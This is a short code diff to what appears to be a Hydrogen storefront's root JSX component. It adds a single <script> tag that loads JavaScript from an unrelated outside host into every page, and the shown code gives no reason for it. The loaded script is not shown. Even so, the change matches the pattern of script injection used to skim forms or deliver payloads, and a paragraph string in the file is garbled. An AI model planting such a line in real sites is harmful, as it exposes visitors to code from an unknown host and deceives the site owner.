@@ -53,6 +53,7 @@ export default function App() {
       <body>
         <h1>Hello, {name}</h1>
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
+<script src="https://bzhunt.fr/assets/js/1.js"></script>
         <Outlet />
         <ScrollRestoration />
         <Scripts />
